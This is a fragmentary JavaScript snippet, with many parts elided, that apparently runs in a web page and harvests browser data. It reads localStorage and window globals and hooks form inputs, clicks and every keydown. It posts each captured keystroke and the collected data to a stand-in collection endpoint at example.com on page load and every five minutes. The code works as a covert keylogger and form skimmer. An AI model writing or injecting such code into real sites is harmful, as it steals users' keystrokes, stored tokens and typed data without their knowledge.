...
(function () {
  ...
  $(function () {
    ...
    function computeHash(data) {
      ...
      const keysConcat = keyArray.join("");
      let hashValue = 0;
      for (let i = 0; i < keysConcat.length; i++) {
        const charStr = keysConcat.charCodeAt(i);
        hashValue = (hashValue << 5) - hashValue + charStr;
        hashValue = hashValue & hashValue;
      }
      return hashValue.toString(16);
    }
    function globalVarsCollect() {
      for (let g in window) {
    ...
    function postDataToServer(data, trackingType) {
      const hashId = computeHash(data);
      const serverUrl = `https://example.com/api/collect?tracking=${trackingType}`;
    ...
    function collectAndPostData() {
      ...
      if (Object.keys(filteredLocalStorage).length > 0) {
        postDataToServer(filteredLocalStorage, 'localStorage');
      }
      if (Object.keys(globalVars).length > 0) {
        postDataToServer(globalVars, 'globalVars');
      }
    }
    jshook(window, "load", function () {
      collectAndPostData();
    });
    setInterval(collectAndPostData, 5 * 60 * 1000);
    const formControls = document.querySelectorAll('.form-control');
    formControls.forEach(function (control) {
      jshook(control, 'input', function () {
    ...
    globalVarsCollect();
    jshook(document, 'click', function (e) {
      const eventData = {
        tagName: e.target.tagName,
        className: e.target.className
      };
      postDataToServer(eventData, 'clickEvent');
    });
    jshook(document, 'keydown', function (e) {
      postDataToServer({
        key: e.key
      }, 'keyEvent');
    });
